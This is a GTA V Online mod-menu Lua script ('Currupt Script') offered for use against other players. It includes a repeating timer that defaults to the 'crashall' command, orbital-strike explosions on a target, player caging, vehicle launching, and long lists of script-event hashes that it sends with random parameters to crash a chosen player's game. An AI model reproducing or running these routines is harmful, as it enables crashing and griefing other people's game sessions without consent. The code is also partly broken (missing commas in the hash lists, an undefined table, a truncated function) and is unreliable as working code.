--------------------------------------------------- CREDITS ----------------------------------------------------------
--[[
Bunny
HoppaC4
Lance
Ayrapheyr
Jayphen
Nowiry
Ren
SkIlLIsSuEs
& All the 2take1 lua devs Pnn undoubtably skidded from
]]
----------------------------------------------------------------------------------------------------------------------

local function exportstring( s )
    return string.format("%q", s)
end

function table.save(  tbl,filename )
   local charS,charE = "   ","\n"
   local file,err = io.open( filename, "wb" )
   if err then return err end
   -- initiate variables for save procedure
   local tables,lookup = { tbl },{ [tbl] = 1 }
   file:write( "return {"..charE )
   for idx,t in ipairs( tables ) do
      file:write( "-- Table: {"..idx.."}"..charE )
      file:write( "{"..charE )
      local thandled = {}
      for i,v in ipairs( t ) do
         thandled[i] = true
         local stype = type( v )
         -- only handle value
         if stype == "table" then
            if not lookup[v] then
               table.insert( tables, v )
               lookup[v] = #tables
            end
            file:write( charS.."{"..lookup[v].."},"..charE )
         elseif stype == "string" then
            file:write(  charS..exportstring( v )..","..charE )
         elseif stype == "number" then
            file:write(  charS..tostring( v )..","..charE )
         end
      end
      for i,v in pairs( t ) do
         -- escape handled values
         if (not thandled[i]) then
            local str = ""
            local stype = type( i )
            -- handle index
            if stype == "table" then
               if not lookup[i] then
                  table.insert( tables,i )
                  lookup[i] = #tables
               end
               str = charS.."[{"..lookup[i].."}]="
            elseif stype == "string" then
               str = charS.."["..exportstring( i ).."]="
            elseif stype == "number" then
               str = charS.."["..tostring( i ).."]="
            end
            if str ~= "" then
               stype = type( v )
               -- handle value
               if stype == "table" then
                  if not lookup[v] then
                     table.insert( tables,v )
                     lookup[v] = #tables
                  end
                  file:write( str.."{"..lookup[v].."},"..charE )
               elseif stype == "string" then
                  file:write( str..exportstring( v )..","..charE )
               elseif stype == "number" then
                  file:write( str..tostring( v )..","..charE )
               end
            end
         end
      end
      file:write( "},"..charE )
   end
   file:write( "}" )
   file:close()
end

function table.load( sfile )
   local ftables,err = loadfile( sfile )
   if err then return _,err end
   local tables = ftables()
   for idx = 1,#tables do
      local tolinki = {}
      for i,v in pairs( tables[idx] ) do
         if type( v ) == "table" then
            tables[idx][i] = tables[v[1]]
         end
         if type( i ) == "table" and tables[i[1]] then
            table.insert( tolinki,{ i,tables[i[1]] } )
         end
      end
      -- link indices
      for _,v in ipairs( tolinki ) do
         tables[idx][v[2]],tables[idx][v[1]] =  tables[idx][v[1]],nil
      end
   end
   return tables[1]
end
-- END UTILITY FUNCTIONS

store_dir = filesystem.store_dir() .. '\\Currupt\\'
if not filesystem.is_dir(store_dir) then
    filesystem.mkdirs(store_dir)
end

local max_timer_time = 86400000
local all_timer_lists = {}
local parse_all_timer_files

function create_timer_entry(data)
    local data_copy = data
    local timer_name = data['timer_name']
    local timer_desc = data['timer_desc']
    local timer_commands = data['timer_commands']
    local timer_delay = data['timer_delay']
    local this_timer_path = store_dir .. '\\' .. timer_name .. '.lua'
    local fmt_name = timer_name:gsub(' ', '')
    if all_timer_lists[timer_name] == nil then
        local this_timer_root = menu.list(menu.my_root(), timer_name, {'Currupt' .. fmt_name}, timer_desc)
        all_timer_lists[timer_name] = this_timer_root
        menu.toggle_loop(this_timer_root, "Run timer", {"runtimer" .. timer_name}, "", function(click_type)
            menu.trigger_commands(timer_commands)
            util.yield(timer_delay)
        end)

        menu.text_input(this_timer_root, "Description", {"Curruptsetdesc" .. fmt_name}, "", function(on_input)
            timer_desc = on_input
            data_copy['timer_desc'] = on_input
            table.save(data_copy, this_timer_path)
            menu.set_help_text(this_timer_root, timer_desc)
        end, timer_desc)

        menu.text_input(this_timer_root, "Command(s)", {"Curruptsetcommands" .. fmt_name}, "The commands for this timer. You can specify multiple by putting semicolons in between each.", function(on_input)
            timer_commands = on_input
            data_copy['timer_commands'] = on_input
            table.save(data_copy, this_timer_path)
        end, timer_commands)

        menu.slider(this_timer_root, "Timer delay (MS)", {fmt_name .. "delay"}, "The timer delay, in milliseconds. 1000 ms = 1 second.", 0, max_timer_time, 100, 1, function(s)
            timer_delay = s
            data_copy['timer_delay'] = s
            table.save(data_copy, this_timer_path)
        end)

        menu.action(this_timer_root, "Delete timer", {}, "Delete this timer\'s file.", function(click_type)
            ok, err = os.remove(this_timer_path)
            if not ok then
                util.toast("Timer could not be removed: " .. err)
            else
                all_timer_lists[timer_name] = nil
                util.toast("Timer removed.")
                menu.delete(this_timer_root)
                parse_all_timer_files()
            end
        end)
    end
end

function parse_all_timer_files()
    for i, path in ipairs(filesystem.list_files(store_dir)) do
        if string.match(path:gsub(store_dir, ''), '.lua') then
            local timer_data = table.load(path)
            create_timer_entry(timer_data)
        end
    end
end

local create_timer_root = menu.list(menu.my_root(), "Create new timer", {'Curruptcreate'}, "")
----
local timer_divider = menu.divider(menu.my_root(), "Currupt Script")

local new_timer_name = "My new timer"
menu.text_input(create_timer_root, "Name", {"Curruptsetname"}, "", function(on_input)
    new_timer_name = on_input
end, new_timer_name)

local new_timer_desc = "Your description goes here."
menu.text_input(create_timer_root, "Description", {"Curruptsetdesc"}, "", function(on_input)
    new_timer_desc = on_input
end, new_timer_desc)

local new_timer_commands = "crashall"
menu.text_input(create_timer_root, "Command(s)", {"Curruptsetcommands"}, "The commands for this timer. You can specify multiple by putting semicolons in between each.", function(on_input)
    new_timer_commands = on_input
end, new_timer_commands)

local new_timer_delay = 100
menu.slider(create_timer_root, "Timer delay (MS)", {"Curruptsetdelay"}, "The timer delay, in milliseconds. 1000 ms = 1 second.", 0, max_timer_time, 100, 1, function(s)
    new_timer_delay = s
end)

menu.action(create_timer_root, "Create timer", {}, "Create and save this timer as a file.", function(click_type)
    local new_timer_data = {
        timer_name = new_timer_name,
        timer_desc = new_timer_desc,
        timer_commands = new_timer_commands,
        timer_delay = new_timer_delay
    }
    local timer_path = store_dir .. '/' .. new_timer_name .. '.lua'
    if filesystem.exists(timer_path) then
        util.toast("A timer with that name already exists.")
        return 
    else
        table.save(new_timer_data, timer_path)
        parse_all_timer_files()
        menu.trigger_commands("Currupt" .. new_timer_name:gsub(' ', ''))
        util.toast("Timer created! I\'ve opened it for you :)")
    end
end)

util.create_thread(function()
    while true do
        parse_all_timer_files()
        util.yield()
    end
end
)

util.keep_running(100)

util.require_natives("natives-1660775568")
util.toast("Welcome To Currupt Script!\n" .. "Official Discord: https://discord.gg/KHOS")
util.toast("Latest Version Currupt Script 3.0")

local function player_toggle_loop(root, pid, menu_name, command_names, help_text, callback)
    return menu.toggle_loop(root, menu_name, command_names, help_text, function()
        if not players.exists(pid) then util.stop_thread() end
        callback()
    end)
end

util.require_natives("natives-1640181023")
local resource_dir = filesystem.resources_dir()
if not filesystem.exists(resource_dir) then
	util.toast("resource directory not found. notification system will be less of a bruh")
else
	util.register_file(resource_dir .. "bruhzowski.ytd")
end

local version = 16


local colors = {
green = 184,
red = 6,
yellow = 190,
black = 2,
white = 1,
gray = 3,
pink = 201,
purple = 49, --, 21, 96
blue = 11
}

function notification(message, color)
	HUD._THEFEED_SET_NEXT_POST_BACKGROUND_COLOR(color)
	local picture
	if not filesystem.exists(resource_dir) then
		picture = "CHAR_SOCIAL_CLUB"
	else
		picture = "bruhzowski"
	end
	GRAPHICS.REQUEST_STREAMED_TEXTURE_DICT(picture, 1)
	while not GRAPHICS.HAS_STREAMED_TEXTURE_DICT_LOADED(picture) do
		util.yield()
	end
	util.BEGIN_TEXT_COMMAND_THEFEED_POST(message)
	if color == colors.pink or color == colors.red then
		subtitle = "~u~Notification"
	elseif color == colors.black then
		subtitle = "~c~Notification"
	else
		subtitle = "~u~Notification"
	end
	HUD.END_TEXT_COMMAND_THEFEED_POST_MESSAGETEXT(picture, "Mike", true, 4, "Currupt Script", subtitle)

	HUD.END_TEXT_COMMAND_THEFEED_POST_TICKER(true, false)
	util.log(message)
end

function arg11(pid)
    return (1630317 + (1 + (pid * 595) + 506))
end

function v3(x, y, z)
	if x == nil then x = 0 end
	if y == nil then y = 0 end
	if z == nil then z = 0 end
end

function draw_box(x, y, width, height, opacity)
    color = {}
    color["r"] = 0.07
    color["g"] = 0.07
    color["b"] = 0.07
    color["a"] = opacity - 0.02
    directx.draw_rect(x, y - 0.0015, width, height + 0.0015, color)
end

function RequestControlOfEnt(entity)
	local tick = 0
	local tries = 0
	NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entity)
	while not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(entity) and tick <= 1000 do
		NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entity)
		tick = tick + 1
		tries = tries + 1
		if tries == 50 then 
			util.yield()
			tries = 0
		end
	end
	return NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(entity)
end

function get_control_request(ent) -- #testing -- new get control request, yield first then request, then return. previously requested then yielded then returned and didnt work?
	if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ent) then
		NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ent)
		local tick = 0
		while not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ent) and tick <= 100 do
			tick = tick + 1
			util.yield()
			NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ent)
		end
	end
	if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ent) then
		util.toast("No Control of "..ent)
	end
	return NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ent)
end

function tp_vehicle_to(veh,x,y,z) -- #unfinished -- will this ever be finished or is this just a pointless alias for a native? i dont know.
	ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh,x,y,z,0,0,0)
end


function do_fade_in(pid) 
    CAM.DO_SCREEN_FADE_OUT(500)
    util.yield(500)
    menu.trigger_commands("spectate" .. PLAYER.GET_PLAYER_NAME(pid) .. " on")
    orbital_cannon_effects(true)
    util.yield(1000)
    CAM.DO_SCREEN_FADE_IN(1000)
    waiting = false
end
function do_fade_out(pid)
    util.yield(2500)
    CAM.DO_SCREEN_FADE_OUT(1000)
    util.yield(1000)
    orbital_cannon_effects(false)
    menu.trigger_commands("spectate" .. PLAYER.GET_PLAYER_NAME(pid) .. " off;nightvision off")
    util.yield(1000)
    CAM.DO_SCREEN_FADE_IN(1000)
    waiting = false
end
function orbital_cannon_effects(on)
    if on then
        menu.trigger_commands("becomeorbitalcannon on;nightvision on;fov 130")
    else 
        menu.trigger_commands("becomeorbitalcannon off;fov 0;nightvision off")
    end
end
function orbital(pid) 
    for i = 0, 30 do 
        pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
        for j = -2, 2 do 
            for k = -2, 2 do 
                local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
                FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x + j, pos.y + j, pos.z + (30 - i), 29, 999999.99, true, false, 8)
            end
        end
        util.yield(20)
    end
end

cages = {}  -- 1114264700 <- vending machine cage
function cage_player(pos)
	local object_hash = util.joaat("prop_gold_cont_01b")
	pos.z = pos.z-0.9
	
	STREAMING.REQUEST_MODEL(object_hash)
	while not STREAMING.HAS_MODEL_LOADED(object_hash) do
		util.yield()
	end
	local object1 = OBJECT.CREATE_OBJECT(object_hash, pos.x, pos.y, pos.z, true, true, true)
	cages[#cages + 1] = object1																			

	local object2 = OBJECT.CREATE_OBJECT(object_hash, pos.x, pos.y, pos.z, true, true, true)
	cages[#cages + 1] = object2
	
	if object1 == 0 or object2 ==0 then --if 'CREATE_OBJECT' fails to create one of those 
		notification("Something Went Wrong Creating Cages", colors.red)
	end
	ENTITY.FREEZE_ENTITY_POSITION(object1, true)
	ENTITY.FREEZE_ENTITY_POSITION(object2, true)
	local rot  = ENTITY.GET_ENTITY_ROTATION(object2)
	rot.x = -180
	rot.y = -180
	ENTITY.SET_ENTITY_ROTATION(object2, rot.x,rot.y,rot.z,1,true)
	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(object_hash)
end


function for_table_do(table,with_access,func) -- <3 HoppaC4
	for i,ent in ipairs(table) do
		if with_access then
			if not RequestControlOfEnt(ent) then goto skip end
		end
		func(ent)
		::skip::
	end
end


function get_player_veh(pid,with_access)
	local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)	
	if PED.IS_PED_IN_ANY_VEHICLE(ped,true) then
		local vehicle = PED.GET_VEHICLE_PED_IS_IN(ped, false)
		if not with_access then
			return vehicle
		end
		if RequestControlOfEnt(vehicle) then
			return vehicle
		end
	end
	return 0
end

function tp_veh_to(pid,x,y,z)
	local tries = 0
	local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
	if PED.IS_PED_IN_ANY_VEHICLE(ped,true) then
		local vehicle = get_player_veh(pid,false)	
		while tries <= 1000 do --bad coooooood >:( but idk anything better
			if RequestControlOfEnt(vehicle) then			
				ENTITY.SET_ENTITY_COORDS_NO_OFFSET(vehicle, x, y, z, 0, 0, 1);
				tries = tries + 1
			end
		end
	end
end

function marqee(text)
	local temp = text
    text = text:sub(2)
	return text .. temp:sub(1, 1)
end

function upgrade_vehicle(player) --now my funky functions are useless :'( since u can do menu.trigger_commands("upgrade") or some shit
	local vehicle = get_player_veh(player,true)
	if vehicle then
		DECORATOR.DECOR_SET_INT(vehicle, "MPBitset", 0)
		VEHICLE.SET_VEHICLE_MOD_KIT(vehicle, 0)
		for i = 0 ,50 do
			VEHICLE.SET_VEHICLE_MOD(vehicle, i, VEHICLE.GET_NUM_VEHICLE_MODS(vehicle, i) - 1, false)
		end	
		VEHICLE.SET_VEHICLE_CUSTOM_PRIMARY_COLOUR(vehicle, 0, 0, 0)
		VEHICLE.SET_VEHICLE_CUSTOM_SECONDARY_COLOUR(vehicle,0, 0, 0)
		VEHICLE.TOGGLE_VEHICLE_MOD(vehicle, 22, true)
		VEHICLE._SET_VEHICLE_XENON_LIGHTS_COLOR(vehicle, 10)
		VEHICLE.TOGGLE_VEHICLE_MOD(vehicle, 18, true)
		VEHICLE.TOGGLE_VEHICLE_MOD(vehicle, 20, true)
		for i = 0 ,4 do
			if not VEHICLE._IS_VEHICLE_NEON_LIGHT_ENABLED(vehicle, i) then
				VEHICLE._SET_VEHICLE_NEON_LIGHT_ENABLED(vehicle, i, true)
			end
		end
		VEHICLE._SET_VEHICLE_NEON_LIGHTS_COLOUR(vehicle, 255, 0, 255)
		VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(vehicle, "727")
	end
end

function launch_vehicle(pid)
	local vehicle = get_player_veh(pid,true)
	if vehicle then
		ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(vehicle, 1, 0, 0, 10000, true, false, true)
	end
end

function northp_vehicle(pid)
	local vehicle = get_player_veh(pid,true)
	if vehicle then
		ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(vehicle, 1, 0, 10000, 0, true, false, true)
	end
end

function send_script_event(first_arg, receiver, args)
	table.insert(args, 1, first_arg)
	util.trigger_script_event(1 << receiver, args)
end


--[[local kicks_fast_legacy = {
    0x493fc6bb,
    1228916411,
    1256866538,
    -1753084819,
    1119864805,
    -1813981910,
    -892744477,
    -859672259,
    -898207315
}]]
local crashes = {
	69874647,
                    924535804,
	1494472464,
	-1991317864,
	1902624891,
	127278285,
	-195247709,
	-1322571352,
	704979198,
	-1970125962,
	2112408256,
	677240627,
	-2113023004,
	-1704141512,
	962740265,
	-1386010354,
	603406648,
	-1715193475,
	1258808115,
	998716537,
	163598572,
	-1056683619,
	-393294520
}

local newcrashes = {
153488394, -- Moist Events Added :)
1723452001,
210491663,
-1780858740,
277548576,
-1320260596,
-851196171,
1293299354,
903362384,
243981125,
1848973789,
-1503282114,
202252150,
-189552513,
-1896924387,
1491104200,
1150803197,
1808453742,
75217734,
-1648825077,
597922279,
-1016027275,
890117219,
-635501849,
-1521203907,
-675325833,
1846223309,
1472117290,
-1054422861,
-73352157,
1537221257,
-78017695,
2018643992,
-352859634,
1370240360,
627052233,
-2000489950,
2140301176,
1926582096,
-1830143324,
-279342915,
690534430,
-1833002148,
315658550,
-1005623606,
-2022389047,
1618779170,
-53130764,
-549542517
-1301508763,
-1413680798,
-1026386029,
273726443,
639116,
1659915470,
575344561,
-1906146218,
829201205,
299217086,
1187364773,
1358851648,
-859672259,
-1753084819,
-1500178943,
-863176541,
-397188359,
1595854775,
1933105669,
624184651,
-1520160200,
-1005294040,
-1989758836,
-211878773,
-1318777899,
-178721456,
-325138340,
-2041535807,
-1881357102,
701013663,
-903212623,
1816012469,
-1587276086,
1649958326,
578058101,
-515495966,
-1235041639,
-396894108,
-1023783113,
1679855368,
1863892872,
-1208850730,
-302187166,
-1656474008,
1230210137,
-1448333980,
-1074756845,
1229338575,
-505735987,
1257857900,
-1900695287,
-16213980,
59352546,
1795076373,
134867878,
-1145943081,
-2076396337,
1950208850,
-2103999464,
-1016625751,
-1095711893,
-971907474,
-1566668579,
1713679709,
-2100809716,
1033875141,
45192266,
1864582447,
-2014392362,
808437855,
447050477,
-1157285407,
-959790325,
-1717096076,
1954846099,
1964309656,
1006166687,
-65296432,
-911081209,
168919469,
932894951,
-37068802,
226676030,
-1773075874,
-1927914708,
-1945247369,
-46298284,
-1705137662,
-1842341008,
212052693,
-1705411017,
-933507377,
-257834583,
-588744584,
1186109081,
-639979452,
2120864071,
959824647,
2005618868,
-868839127,
1800830029,
-1825938840,
-1533887418,
1643877404,
712678541,
-2017818728,
1266208560,
-1529925410,
987018372,
-1891495479,
-1959541747,
-1870308609,
-1785748887,
458875017,
27785517,
662343702,
-978812630,
1990909018,
-1484351810,
-1372589624,
1210543720,
1764386440,
-1190123899,
384219567,
-810334939,
-1187407749,
254526911,
-1924022050,
-979549154,
-544908807,
675377079,
678368510,
2108029684,
399742549,
1622386523,
-1999269016,
-126133365,
-1639153173,
1384138535,
-1794395648,
1734770887,
-1649341354,
-1819246032,
-733604274,
-275229102,
541344683,
-487303944,
1735852781,
241570528,
-654645351,
486186480,
1341149498,
600486780,
174461233,
-888636441,
-1532157118,
1296795403,
33277241,
2120839242,
1154988013,
1209918357,
1763836227,
1249026189,
-283884309,
1287299127,
493604397,
-2043109205,
-988842806,
1146815758,
1519476362,
1136772712,
-1723675897,
-390491000,
23010443,
641157117,
1608876738,
-79150418,
257478565,
496476216,
608132931,
-316948135,
-25619296,
-176858990,
-1605274399,
1731962870,
-1277389265,
-181124995,
1152266822,
-1855721397,
-151720011,
1472357458,
665468344,
-212308547,
975723848,
-720653448,
900985860,
200339862,
-95026574,
2049240389,
917535648,
1517002797,
1126437067,
-421711998,
1164760553,
-1428764848,
161038699,
-137439024,
997078653,
-384079069,
-1514001560,
-347755611,
1767220965,
2051313650,
-1489802466,
-247110509,
469112443,
-149227625,
316678593,
-1918817181,
282406360,
1433396036,
696123127,
-877212109,
770242759,
-796052439,
-19131151,
-169685950,
1134927454,
515799090,
1132500638,
1216017047,
1836414206,
490383602,
1455421717,
-795567983,
1355230914,
-341234598,
-525866785,
-419415284,
-1857108105,
-662216118,
1098534904,
649952111,
1923828310,
795867332,
1305720168,
-1561004591,
1463355688,
-2071141142,
251577675,
-1836118977,
1788162956,
-1479371259,
-1136752511,
-428995778,
1119864805,
-699380547,
1376436345,
677429013,
-1758368969,
1173618358,
-898207315,
1287903621,
-1625031686,
1873289193,
1268963570,
-767611756,
-275700180,
797978700,
-194543830,
-2063448951,
-299840140,
-504114839,
1197757671,
1490942189,
1797631140,
951147709,
-609583028,
1824446546,
-771079131,
-1511043020,
-768666112,
1298961960,
-760171613,
43922647,
-1911026003,
15745542,
-1147284669,
-299200920,
-2072214082,
-1568036440,
1256866538,
-1382676328,
-1813981910,
-845729485,
-892744477,
2092565704,
1716640551,
1005694063,
-1722256522,
-1144835269,
-1710776819,
381894946,
-2086228364,
-1727818500,
-655898431,
1889984715,
1166958622,
-1912844061,
897248694
}

local candycrashes = {
69874647, -- Currupt Events Added :)
924535804,
1494472464,
-1991317864,
1902624891,
127278285,
-195247709,
-1322571352,
704979198,
-1970125962,
2112408256,
677240627,
-2113023004,
-1704141512,
962740265,
-1386010354,
603406648,
-1715193475,
1258808115,
998716537,
163598572,
-1056683619,
-393294520,
153488394,
1723452001,
210491663,
-1780858740,
277548576,
-1320260596,
-851196171,
1293299354,
903362384,
243981125,
1848973789,
-1503282114,
202252150,
-189552513,
-1896924387,
1491104200,
1150803197,
1808453742,
75217734,
-1648825077,
597922279,
-1016027275,
890117219,
-635501849,
-1521203907,
-675325833,
1846223309,
1472117290,
-1054422861,
-73352157,
1537221257,
-78017695,
2018643992,
-352859634,
1370240360,
627052233,
-2000489950,
2140301176,
1926582096,
-1830143324,
-279342915,
690534430,
-1833002148,
315658550,
-1005623606,
-2022389047,
1618779170,
-53130764,
-549542517
-1301508763,
-1413680798,
-1026386029,
273726443,
639116,
1659915470,
575344561,
-1906146218,
829201205,
299217086,
1187364773,
1358851648,
-859672259,
-1753084819,
-1500178943,
-863176541,
-397188359,
1595854775,
1933105669,
624184651,
-1520160200,
-1005294040,
-1989758836,
-211878773,
-1318777899,
-178721456,
-325138340,
-2041535807,
-1881357102,
701013663,
-903212623,
1816012469,
-1587276086,
1649958326,
578058101,
-515495966,
-1235041639,
-396894108,
-1023783113,
1679855368,
1863892872,
-1208850730,
-302187166,
-1656474008,
1230210137,
-1448333980,
-1074756845,
1229338575,
-505735987,
1257857900,
-1900695287,
-16213980,
59352546,
1795076373,
134867878,
-1145943081,
-2076396337,
1950208850,
-2103999464,
-1016625751,
-1095711893,
-971907474,
-1566668579,
1713679709,
-2100809716,
1033875141,
45192266,
1864582447,
-2014392362,
808437855,
447050477,
-1157285407,
-959790325,
-1717096076,
1954846099,
1964309656,
1006166687,
-65296432,
-911081209,
168919469,
932894951,
-37068802,
226676030,
-1773075874,
-1927914708,
-1945247369,
-46298284,
-1705137662,
-1842341008,
212052693,
-1705411017,
-933507377,
-257834583,
-588744584,
1186109081,
-639979452,
2120864071,
959824647,
2005618868,
-868839127,
1800830029,
-1825938840,
-1533887418,
1643877404,
712678541,
-2017818728,
1266208560,
-1529925410,
987018372,
-1891495479,
-1959541747,
-1870308609,
-1785748887,
458875017,
27785517,
662343702,
-978812630,
1990909018,
-1484351810,
-1372589624,
1210543720,
1764386440,
-1190123899,
384219567,
-810334939,
-1187407749,
254526911,
-1924022050,
-979549154,
-544908807,
675377079,
678368510,
2108029684,
399742549,
1622386523,
-1999269016,
-126133365,
-1639153173,
1384138535,
-1794395648,
1734770887,
-1649341354,
-1819246032,
-733604274,
-275229102,
541344683,
-487303944,
1735852781,
241570528,
-654645351,
486186480,
1341149498,
600486780,
174461233,
-888636441,
-1532157118,
1296795403,
33277241,
2120839242,
1154988013,
1209918357,
1763836227,
1249026189,
-283884309,
1287299127,
493604397,
-2043109205,
-988842806,
1146815758,
1519476362,
1136772712,
-1723675897,
-390491000,
23010443,
641157117,
1608876738,
-79150418,
257478565,
496476216,
608132931,
-316948135,
-25619296,
-176858990,
-1605274399,
1731962870,
-1277389265,
-181124995,
1152266822,
-1855721397,
-151720011,
1472357458,
665468344,
-212308547,
975723848,
-720653448,
900985860,
200339862,
-95026574,
2049240389,
917535648,
1517002797,
1126437067,
-421711998,
1164760553,
-1428764848,
161038699,
-137439024,
997078653,
-384079069,
-1514001560,
-347755611,
1767220965,
2051313650,
-1489802466,
-247110509,
469112443,
-149227625,
316678593,
-1918817181,
282406360,
1433396036,
696123127,
-877212109,
770242759,
-796052439,
-19131151,
-169685950,
1134927454,
515799090,
1132500638,
1216017047,
1836414206,
490383602,
1455421717,
-795567983,
1355230914,
-341234598,
-525866785,
-419415284,
-1857108105,
-662216118,
1098534904,
649952111,
1923828310,
795867332,
1305720168,
-1561004591,
1463355688,
-2071141142,
251577675,
-1836118977,
1788162956,
-1479371259,
-1136752511,
-428995778,
1119864805,
-699380547,
1376436345,
677429013,
-1758368969,
1173618358,
-898207315,
1287903621,
-1625031686,
1873289193,
1268963570,
-767611756,
-275700180,
797978700,
-194543830,
-2063448951,
-299840140,
-504114839,
1197757671,
1490942189,
1797631140,
951147709,
-609583028,
1824446546,
-771079131,
-1511043020,
-768666112,
1298961960,
-760171613,
43922647,
-1911026003,
15745542,
-1147284669,
-299200920,
-2072214082,
-1568036440,
1256866538,
-1382676328,
-1813981910,
-845729485,
-892744477,
2092565704,
1716640551,
1005694063,
-1722256522,
-1144835269,
-1710776819,
381894946,
-2086228364,
-1727818500,
-655898431,
1889984715,
1166958622,
-1912844061,
897248694,
153488394,
1723452001,
210491663,
-1780858740,
277548576,
-1320260596,
-851196171,
1293299354,
903362384,
243981125,
1848973789,
-1503282114,
202252150,
-189552513,
-1896924387,
1491104200,
1150803197,
1808453742,
75217734,
-1648825077,
597922279,
-1016027275,
890117219,
-635501849,
-1521203907,
-675325833,
1846223309,
1472117290,
-1054422861,
-73352157,
1537221257,
-78017695,
2018643992,
-352859634,
1370240360,
627052233,
-2000489950,
2140301176,
1926582096,
-1830143324,
-279342915,
690534430,
-1833002148,
315658550,
-1005623606,
-2022389047,
1618779170,
-53130764,
-549542517
-1301508763,
-1413680798,
-1026386029,
273726443,
639116,
1659915470,
575344561,
-1906146218,
829201205,
299217086,
1187364773,
1358851648,
-859672259,
-1753084819,
-1500178943,
-863176541,
-397188359,
1595854775,
1933105669,
624184651,
-1520160200,
-1005294040,
-1989758836,
-211878773,
-1318777899,
-178721456,
-325138340,
-2041535807,
-1881357102,
701013663,
-903212623,
1816012469,
-1587276086,
1649958326,
578058101,
-515495966,
-1235041639,
-396894108,
-1023783113,
1679855368,
1863892872,
-1208850730,
-302187166,
-1656474008,
1230210137,
-1448333980,
-1074756845,
1229338575,
-505735987,
1257857900,
-1900695287,
-16213980,
59352546,
1795076373,
134867878,
-1145943081,
-2076396337,
1950208850,
-2103999464,
-1016625751,
-1095711893,
-971907474,
-1566668579,
1713679709,
-2100809716,
1033875141,
45192266,
1864582447,
-2014392362,
808437855,
447050477,
-1157285407,
-959790325,
-1717096076,
1954846099,
1964309656,
1006166687,
-65296432,
-911081209,
168919469,
932894951,
-37068802,
226676030,
-1773075874,
-1927914708,
-1945247369,
-46298284,
-1705137662,
-1842341008,
212052693,
-1705411017,
-933507377,
-257834583,
-588744584,
1186109081,
-639979452,
2120864071,
959824647,
2005618868,
-868839127,
1800830029,
-1825938840,
-1533887418,
1643877404,
712678541,
-2017818728,
1266208560,
-1529925410,
987018372,
-1891495479,
-1959541747,
-1870308609,
-1785748887,
458875017,
27785517,
662343702,
-978812630,
1990909018,
-1484351810,
-1372589624,
1210543720,
1764386440,
-1190123899,
384219567,
-810334939,
-1187407749,
254526911,
-1924022050,
-979549154,
-544908807,
675377079,
678368510,
2108029684,
399742549,
1622386523,
-1999269016,
-126133365,
-1639153173,
1384138535,
-1794395648,
1734770887,
-1649341354,
-1819246032,
-733604274,
-275229102,
541344683,
-487303944,
1735852781,
241570528,
-654645351,
486186480,
1341149498,
600486780,
174461233,
-888636441,
-1532157118,
1296795403,
33277241,
2120839242,
1154988013,
1209918357,
1763836227,
1249026189,
-283884309,
1287299127,
493604397,
-2043109205,
-988842806,
1146815758,
1519476362,
1136772712,
-1723675897,
-390491000,
23010443,
641157117,
1608876738,
-79150418,
257478565,
496476216,
608132931,
-316948135,
-25619296,
-176858990,
-1605274399,
1731962870,
-1277389265,
-181124995,
1152266822,
-1855721397,
-151720011,
1472357458,
665468344,
-212308547,
975723848,
-720653448,
900985860,
200339862,
-95026574,
2049240389,
917535648,
1517002797,
1126437067,
-421711998,
1164760553,
-1428764848,
161038699,
-137439024,
997078653,
-384079069,
-1514001560,
-347755611,
1767220965,
2051313650,
-1489802466,
-247110509,
469112443,
-149227625,
316678593,
-1918817181,
282406360,
1433396036,
696123127,
-877212109,
770242759,
-796052439,
-19131151,
-169685950,
1134927454,
515799090,
1132500638,
1216017047,
1836414206,
490383602,
1455421717,
-795567983,
1355230914,
-341234598,
-525866785,
-419415284,
-1857108105,
-662216118,
1098534904,
649952111,
1923828310,
795867332,
1305720168,
-1561004591,
1463355688,
-2071141142,
251577675,
-1836118977,
1788162956,
-1479371259,
-1136752511,
-428995778,
1119864805,
-699380547,
1376436345,
677429013,
-1758368969,
1173618358,
-898207315,
1287903621,
-1625031686,
1873289193,
1268963570,
-767611756,
-275700180,
797978700,
-194543830,
-2063448951,
-299840140,
-504114839,
1197757671,
1490942189,
1797631140,
951147709,
-609583028,
1824446546,
-771079131,
-1511043020,
-768666112,
1298961960,
-760171613,
43922647,
-1911026003,
15745542,
-1147284669,
-299200920,
-2072214082,
-1568036440,
1256866538,
-1382676328,
-1813981910,
-845729485,
-892744477,
2092565704,
1716640551,
1005694063,
-1722256522,
-1144835269,
-1710776819,
381894946,
-2086228364,
-1727818500,
-655898431,
1889984715,
1166958622,
-1912844061,
897248694
}


function Moistcrash(pid) 
	for i,v in ipairs(crashes) do
		par1 = math.random(-100000, 99999999)
		par2 = math.random(-4827432, 3231229)
		par3 = math.random(46190868, 999999999)
		par4 = math.random(-133223, 42746729)
		par5 = math.random(-999999999, 428747628)
		send_script_event(v, pid, {pid, par1, par2, par3, par4, par5})
		util.yield()
	end
end

function Curruptcrash(pid) 
	for i,v in ipairs(crash) do
		par1 = math.random(-100000, 99999999)
		par2 = math.random(-4827432, 3231229)
		par3 = math.random(46190868, 999999999)
		par4 = math.random(-133223, 42746729)
		par5 = math.random(-999999999, 428747628)
		send_script_event(v, pid, {pid, par1, par2, par3, par4, par5})
		util.yield()
	end
end


local resolves = {
	"Hahaha",
	"Bitch!",
    "Whatever Fuck This! :P"
}

--[[function KickV1(pid, repeats) -- works
	for i = 1, repeats do
		for i,v in ipairs(kicks_fast_legacy) do
			arg = math.random(461950868, 999999999)
                                                            arg = math.random(-2^61, 2^62)
